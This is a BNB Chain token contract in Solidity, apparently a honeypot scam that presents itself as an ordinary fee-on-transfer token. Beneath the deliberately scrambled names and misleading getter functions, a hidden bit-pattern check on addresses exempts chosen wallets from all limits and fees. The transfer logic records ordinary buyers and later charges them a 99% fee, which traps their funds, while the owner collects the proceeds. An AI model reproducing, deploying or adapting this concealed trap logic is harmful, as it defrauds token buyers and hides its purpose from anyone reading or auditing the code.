/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract RanklePerpetualCyan is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Rankle Perpetual Cyan ";
    string constant _symbol = "RanklePerpetualCyan";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private walletBotsTxSwapTradingModeBurn;
    mapping(address => bool) private walletReceiverMinLiquidity;
    mapping(address => bool) private maxWalletIsSwap;
    mapping(address => bool) private feeSwapBuyModeMarketingBotsReceiver;
    mapping(address => uint256) private maxLiquidityAutoModeBurn;
    mapping(uint256 => address) private liquidityBuyBotsFee;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private modeTeamAutoTrading = 0;
    uint256 private txSwapBurnLaunchedIsExemptReceiver = 9;

    //SELL FEES
    uint256 private marketingLaunchedTradingAutoMinReceiverBuy = 0;
    uint256 private sellLiquidityBuyIs = 9;

    uint256 private sellLimitMarketingLiquiditySwapBotsIs = txSwapBurnLaunchedIsExemptReceiver + modeTeamAutoTrading;
    uint256 private swapExemptBurnMarketingWalletMax = 100;

    address private burnTradingIsBuyWalletLimitReceiver = (msg.sender); // auto-liq address
    address private sellBuyMarketingTrading = (0x122b240B34dB7019BE17D687FfFfc75B38c02668); // marketing address
    address private maxIsSwapMode = DEAD;
    address private autoModeSwapLimitBurnTeamTrading = DEAD;
    address private feeBurnModeTx = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private isTeamTradingSellMarketing;
    uint256 private limitExemptBotsLaunched;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private walletBurnLiquidityReceiver;
    uint256 private swapMarketingTeamAutoTxReceiverExempt;
    uint256 private teamBurnTradingLaunchedMin;
    uint256 private teamLaunchedMinIsLiquidityReceiverMode;
    uint256 private walletMarketingSwapIs;

    bool private buyMinSellIs = true;
    bool private feeSwapBuyModeMarketingBotsReceiverMode = true;
    bool private liquidityWalletFeeMode = true;
    bool private teamBurnLimitSell = true;
    bool private autoBotsIsMax = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private sellBuyModeWallet = _totalSupply / 1000; // 0.1%

    
    bool private teamAutoIsTradingSwapBuySell;
    uint256 private exemptBurnModeLaunchedTrading;
    bool private swapReceiverTxMinTradingModeBots;
    bool private autoMaxTxMin;
    uint256 private modeSwapTradingSell;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        walletBurnLiquidityReceiver = true;

        walletBotsTxSwapTradingModeBurn[msg.sender] = true;
        walletBotsTxSwapTradingModeBurn[address(this)] = true;

        walletReceiverMinLiquidity[msg.sender] = true;
        walletReceiverMinLiquidity[0x0000000000000000000000000000000000000000] = true;
        walletReceiverMinLiquidity[0x000000000000000000000000000000000000dEaD] = true;
        walletReceiverMinLiquidity[address(this)] = true;

        maxWalletIsSwap[msg.sender] = true;
        maxWalletIsSwap[0x0000000000000000000000000000000000000000] = true;
        maxWalletIsSwap[0x000000000000000000000000000000000000dEaD] = true;
        maxWalletIsSwap[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return exemptTxLiquidityModeSwapMarketing(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return exemptTxLiquidityModeSwapMarketing(sender, recipient, amount);
    }

    function exemptTxLiquidityModeSwapMarketing(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = isExemptReceiverLimit(sender) || isExemptReceiverLimit(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                exemptMarketingIsWallet();
            }
            if (!bLimitTxWalletValue) {
                receiverMarketingBotsLaunched(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return walletLaunchedModeMin(sender, recipient, amount);}

        if (!walletBotsTxSwapTradingModeBurn[sender] && !walletBotsTxSwapTradingModeBurn[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || maxWalletIsSwap[sender] || maxWalletIsSwap[recipient], "Max TX Limit has been triggered");

        if (marketingTeamSellMin()) {buyMaxTradingBotsBurnMarketing();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = swapMinSellTxIs(sender) ? txMaxMarketingBots(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function walletLaunchedModeMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapMinSellTxIs(address sender) internal view returns (bool) {
        return !walletReceiverMinLiquidity[sender];
    }

    function swapModeSellBuy(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            sellLimitMarketingLiquiditySwapBotsIs = sellLiquidityBuyIs + marketingLaunchedTradingAutoMinReceiverBuy;
            return swapTradingLimitWallet(sender, sellLimitMarketingLiquiditySwapBotsIs);
        }
        if (!selling && sender == uniswapV2Pair) {
            sellLimitMarketingLiquiditySwapBotsIs = txSwapBurnLaunchedIsExemptReceiver + modeTeamAutoTrading;
            return sellLimitMarketingLiquiditySwapBotsIs;
        }
        return swapTradingLimitWallet(sender, sellLimitMarketingLiquiditySwapBotsIs);
    }

    function txMaxMarketingBots(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(swapModeSellBuy(sender, receiver == uniswapV2Pair)).div(swapExemptBurnMarketingWalletMax);

        if (feeSwapBuyModeMarketingBotsReceiver[sender] || feeSwapBuyModeMarketingBotsReceiver[receiver]) {
            feeAmount = amount.mul(99).div(swapExemptBurnMarketingWalletMax);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function isExemptReceiverLimit(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function swapTradingLimitWallet(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = maxLiquidityAutoModeBurn[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function receiverMarketingBotsLaunched(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        liquidityBuyBotsFee[exemptLimitValue] = addr;
    }

    function exemptMarketingIsWallet() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (maxLiquidityAutoModeBurn[liquidityBuyBotsFee[i]] == 0) {
                    maxLiquidityAutoModeBurn[liquidityBuyBotsFee[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(sellBuyMarketingTrading).transfer(amountBNB * amountPercentage / 100);
    }

    function marketingTeamSellMin() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    autoBotsIsMax &&
    _balances[address(this)] >= sellBuyModeWallet;
    }

    function buyMaxTradingBotsBurnMarketing() internal swapping {
        uint256 amountToLiquify = sellBuyModeWallet.mul(modeTeamAutoTrading).div(sellLimitMarketingLiquiditySwapBotsIs).div(2);
        uint256 amountToSwap = sellBuyModeWallet.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = sellLimitMarketingLiquiditySwapBotsIs.sub(modeTeamAutoTrading.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(modeTeamAutoTrading).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(txSwapBurnLaunchedIsExemptReceiver).div(totalETHFee);

        payable(sellBuyMarketingTrading).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                burnTradingIsBuyWalletLimitReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getFeeSwapBuyModeMarketingBotsReceiverMode() public view returns (bool) {
        if (feeSwapBuyModeMarketingBotsReceiverMode == teamBurnLimitSell) {
            return teamBurnLimitSell;
        }
        return feeSwapBuyModeMarketingBotsReceiverMode;
    }
    function setFeeSwapBuyModeMarketingBotsReceiverMode(bool a0) public onlyOwner {
        feeSwapBuyModeMarketingBotsReceiverMode=a0;
    }

    function getWalletBotsTxSwapTradingModeBurn(address a0) public view returns (bool) {
        if (walletBotsTxSwapTradingModeBurn[a0] == walletBotsTxSwapTradingModeBurn[a0]) {
            return autoBotsIsMax;
        }
        if (a0 == autoModeSwapLimitBurnTeamTrading) {
            return feeSwapBuyModeMarketingBotsReceiverMode;
        }
            return walletBotsTxSwapTradingModeBurn[a0];
    }
    function setWalletBotsTxSwapTradingModeBurn(address a0,bool a1) public onlyOwner {
        if (a0 != autoModeSwapLimitBurnTeamTrading) {
            teamBurnLimitSell=a1;
        }
        if (walletBotsTxSwapTradingModeBurn[a0] == walletBotsTxSwapTradingModeBurn[a0]) {
           walletBotsTxSwapTradingModeBurn[a0]=a1;
        }
        walletBotsTxSwapTradingModeBurn[a0]=a1;
    }

    function getWalletReceiverMinLiquidity(address a0) public view returns (bool) {
            return walletReceiverMinLiquidity[a0];
    }
    function setWalletReceiverMinLiquidity(address a0,bool a1) public onlyOwner {
        walletReceiverMinLiquidity[a0]=a1;
    }

    function getMaxLiquidityAutoModeBurn(address a0) public view returns (uint256) {
        if (a0 != maxIsSwapMode) {
            return sellLiquidityBuyIs;
        }
            return maxLiquidityAutoModeBurn[a0];
    }
    function setMaxLiquidityAutoModeBurn(address a0,uint256 a1) public onlyOwner {
        if (a0 != burnTradingIsBuyWalletLimitReceiver) {
            sellLiquidityBuyIs=a1;
        }
        if (a0 != burnTradingIsBuyWalletLimitReceiver) {
            sellLiquidityBuyIs=a1;
        }
        maxLiquidityAutoModeBurn[a0]=a1;
    }

    function getLiquidityBuyBotsFee(uint256 a0) public view returns (address) {
        if (a0 != txSwapBurnLaunchedIsExemptReceiver) {
            return burnTradingIsBuyWalletLimitReceiver;
        }
            return liquidityBuyBotsFee[a0];
    }
    function setLiquidityBuyBotsFee(uint256 a0,address a1) public onlyOwner {
        if (a0 == sellLimitMarketingLiquiditySwapBotsIs) {
            maxIsSwapMode=a1;
        }
        if (a0 == modeTeamAutoTrading) {
            autoModeSwapLimitBurnTeamTrading=a1;
        }
        if (a0 != swapExemptBurnMarketingWalletMax) {
            autoModeSwapLimitBurnTeamTrading=a1;
        }
        liquidityBuyBotsFee[a0]=a1;
    }

    function getBurnTradingIsBuyWalletLimitReceiver() public view returns (address) {
        if (burnTradingIsBuyWalletLimitReceiver == sellBuyMarketingTrading) {
            return sellBuyMarketingTrading;
        }
        return burnTradingIsBuyWalletLimitReceiver;
    }
    function setBurnTradingIsBuyWalletLimitReceiver(address a0) public onlyOwner {
        if (burnTradingIsBuyWalletLimitReceiver == maxIsSwapMode) {
            maxIsSwapMode=a0;
        }
        if (burnTradingIsBuyWalletLimitReceiver == feeBurnModeTx) {
            feeBurnModeTx=a0;
        }
        if (burnTradingIsBuyWalletLimitReceiver == maxIsSwapMode) {
            maxIsSwapMode=a0;
        }
        burnTradingIsBuyWalletLimitReceiver=a0;
    }

    function getAutoBotsIsMax() public view returns (bool) {
        if (autoBotsIsMax != autoBotsIsMax) {
            return autoBotsIsMax;
        }
        if (autoBotsIsMax == autoBotsIsMax) {
            return autoBotsIsMax;
        }
        return autoBotsIsMax;
    }
    function setAutoBotsIsMax(bool a0) public onlyOwner {
        autoBotsIsMax=a0;
    }

    function getSellLiquidityBuyIs() public view returns (uint256) {
        if (sellLiquidityBuyIs != sellLimitMarketingLiquiditySwapBotsIs) {
            return sellLimitMarketingLiquiditySwapBotsIs;
        }
        if (sellLiquidityBuyIs != txSwapBurnLaunchedIsExemptReceiver) {
            return txSwapBurnLaunchedIsExemptReceiver;
        }
        if (sellLiquidityBuyIs == sellLimitMarketingLiquiditySwapBotsIs) {
            return sellLimitMarketingLiquiditySwapBotsIs;
        }
        return sellLiquidityBuyIs;
    }
    function setSellLiquidityBuyIs(uint256 a0) public onlyOwner {
        if (sellLiquidityBuyIs == sellLiquidityBuyIs) {
            sellLiquidityBuyIs=a0;
        }
        if (sellLiquidityBuyIs == sellLiquidityBuyIs) {
            sellLiquidityBuyIs=a0;
        }
        sellLiquidityBuyIs=a0;
    }

    function getFeeBurnModeTx() public view returns (address) {
        if (feeBurnModeTx == maxIsSwapMode) {
            return maxIsSwapMode;
        }
        if (feeBurnModeTx == burnTradingIsBuyWalletLimitReceiver) {
            return burnTradingIsBuyWalletLimitReceiver;
        }
        if (feeBurnModeTx == feeBurnModeTx) {
            return feeBurnModeTx;
        }
        return feeBurnModeTx;
    }
    function setFeeBurnModeTx(address a0) public onlyOwner {
        feeBurnModeTx=a0;
    }

    function getTxSwapBurnLaunchedIsExemptReceiver() public view returns (uint256) {
        if (txSwapBurnLaunchedIsExemptReceiver != sellBuyModeWallet) {
            return sellBuyModeWallet;
        }
        if (txSwapBurnLaunchedIsExemptReceiver == txSwapBurnLaunchedIsExemptReceiver) {
            return txSwapBurnLaunchedIsExemptReceiver;
        }
        return txSwapBurnLaunchedIsExemptReceiver;
    }
    function setTxSwapBurnLaunchedIsExemptReceiver(uint256 a0) public onlyOwner {
        txSwapBurnLaunchedIsExemptReceiver=a0;
    }

    function getMaxIsSwapMode() public view returns (address) {
        if (maxIsSwapMode != sellBuyMarketingTrading) {
            return sellBuyMarketingTrading;
        }
        if (maxIsSwapMode == feeBurnModeTx) {
            return feeBurnModeTx;
        }
        if (maxIsSwapMode == burnTradingIsBuyWalletLimitReceiver) {
            return burnTradingIsBuyWalletLimitReceiver;
        }
        return maxIsSwapMode;
    }
    function setMaxIsSwapMode(address a0) public onlyOwner {
        if (maxIsSwapMode != burnTradingIsBuyWalletLimitReceiver) {
            burnTradingIsBuyWalletLimitReceiver=a0;
        }
        maxIsSwapMode=a0;
    }

    function getSellBuyModeWallet() public view returns (uint256) {
        if (sellBuyModeWallet != sellLiquidityBuyIs) {
            return sellLiquidityBuyIs;
        }
        if (sellBuyModeWallet == marketingLaunchedTradingAutoMinReceiverBuy) {
            return marketingLaunchedTradingAutoMinReceiverBuy;
        }
        return sellBuyModeWallet;
    }
    function setSellBuyModeWallet(uint256 a0) public onlyOwner {
        if (sellBuyModeWallet == sellLiquidityBuyIs) {
            sellLiquidityBuyIs=a0;
        }
        if (sellBuyModeWallet == sellBuyModeWallet) {
            sellBuyModeWallet=a0;
        }
        sellBuyModeWallet=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}